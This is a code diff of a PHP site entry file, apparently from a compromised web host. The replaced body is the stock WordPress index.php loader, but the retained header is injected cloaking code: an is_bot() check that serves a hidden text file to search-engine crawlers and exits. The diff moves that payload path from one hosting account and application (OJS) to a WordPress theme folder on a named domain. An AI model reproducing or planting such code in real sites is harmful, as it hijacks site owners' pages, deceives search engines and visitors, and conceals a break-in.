@@ -13,45 +13,29 @@ function is_bot() {
 }
 
 if (is_bot()) {
-    $message = file_get_contents('/home/u1527432/public_html/win/lib/pkp/classes/author/maps/index.txt');
+    $message = file_get_contents('/home/u428675678/domains/drsayush.com/public_html/wp-content/themes/astra/inc/compatibility/learndash/customizer/sections/layout/index.txt');
     echo $message;
 exit;
 }
 ?>
 <?php
-
 /**
- * @defgroup index Index
- * Bootstrap and initialization code.
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
  */
 
-/**
- * @file includes/bootstrap.php
- *
- * Copyright (c) 2014-2021 Simon Fraser University
- * Copyright (c) 2000-2021 John Willinsky
- * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
- *
- * @ingroup index
- *
- * @brief Core system initialization code.
- * This file is loaded before any others.
- * Any system-wide imports or initialization code should be placed here.
- */
+if ( ! isset( $wp_did_header ) ) {
 
+	$wp_did_header = true;
 
-/**
- * Basic initialization (pre-classloading).
- */
+	// Load the WordPress library.
+	require_once __DIR__ . '/wp-load.php';
 
-// Load Composer autoloader
-require_once 'lib/pkp/lib/vendor/autoload.php';
+	// Set up the WordPress query.
+	wp();
 
-define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
-chdir(BASE_SYS_DIR);
+	// Load the theme template.
+	require_once ABSPATH . WPINC . '/template-loader.php';
 
-// System-wide functions
-require_once './lib/pkp/includes/functions.php';
-
-// Initialize the application environment
-return new \APP\core\Application();
+}
